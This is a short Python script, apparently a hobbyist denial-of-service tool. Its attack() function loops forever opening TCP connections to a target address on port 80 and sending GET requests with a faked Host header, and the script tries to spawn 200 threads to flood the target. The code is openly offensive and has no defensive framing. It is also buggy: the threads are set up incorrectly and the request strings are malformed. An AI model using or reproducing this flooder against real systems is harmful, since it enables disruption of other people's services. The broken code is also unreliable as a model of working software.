import socket
import threading

ip_addr = '192.168.1.1'
port = 80
fk_ip = '10.0.0.5'

""" 
     This is main function in which connection is made through socket.
     socket.AF_INET tell to make connection through internet and socket.SOCK_STREAM tell that we use TCP protocol 
"""

def attack():
    while True:
        socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_connection.connect((ip_addr, port))
        '''Here we creating and disconnecting the connections using connect and sendto methods'''
        socket_connection.sendto(("GET /" + ip_addr + "HTTP/1.1\r\n\r\n").encode('ascii'), (ip_addr, port))
        socket_connection.sendto(("Host :" + fk_ip + "\r\n\r\n").encode('ascii'), (ip_addr, port))
        socket_connection.close()


for i in range(200):
    thread = threading.Thread(target=attack())
thread.start()

"""
Going to add more feature 
"""
